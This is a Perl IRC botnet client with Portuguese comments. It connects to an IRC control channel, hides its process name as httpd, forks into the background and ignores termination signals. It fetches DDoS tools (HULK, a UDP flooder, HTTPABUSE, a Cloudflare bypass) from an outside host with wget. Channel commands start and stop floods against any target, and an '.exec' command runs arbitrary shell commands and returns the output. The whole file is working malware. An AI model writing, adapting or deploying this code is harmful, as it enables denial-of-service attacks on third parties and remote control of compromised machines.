#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "irc.data.lt"; 
my $code = int(rand(100000));
my $channel = "#channelirchere";
my $port    =   "6667";
my $nick    = "NAMEBOT_$code"; #$code vai gerar um número aleatório#

# for bypass cloudflare #
unless (-e "cfbypass.py") {
  print "[*] Instalando o CF-BYPASS...";
  system("wget https://offensive-info.com/script/cf -O cfbypass.py");
}

# http #
unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://offensive-info.com/script/hulk -O hulk.py");
}

# udp #
unless (-e "udp1.pl") { 
  print "[*] Instalando UDPFlooder... ";
  system("wget https://offensive-info.com/script/udp -O udp1.pl");
}

# http #
unless (-e "httpabuse.pl") { 
  print "[*] Instalando HTTPABUSE... ";
  system("wget https://offensive-info.com/script/httpabuse -O httpabuse.pl");
}

all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack started at $1, use !stophulk for stop :P \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!cfbypass (.*)$/g ){##########
        my $target_cf = $1;
        $target_cf =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack started at $1, use !stopcf for stop :P \r\n";
        system("nohup python cfbypass.py $target_cf > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopcf/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f cfbypass");
      }

      if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack started at $target_udp, use !stopudp for stop :P \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f udp1");
      }

    if ( $log =~ m/:!httpabuse (.*)$/g ){##########
        my $target_httpabuse = $1;
        $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpabuse;
        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
        system("nohup perl httpabuse.pl $target_httpabuse 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopabuse/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f httpabuse");
      }


      if ( $log =~ m/:.exec (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
	
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :$comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
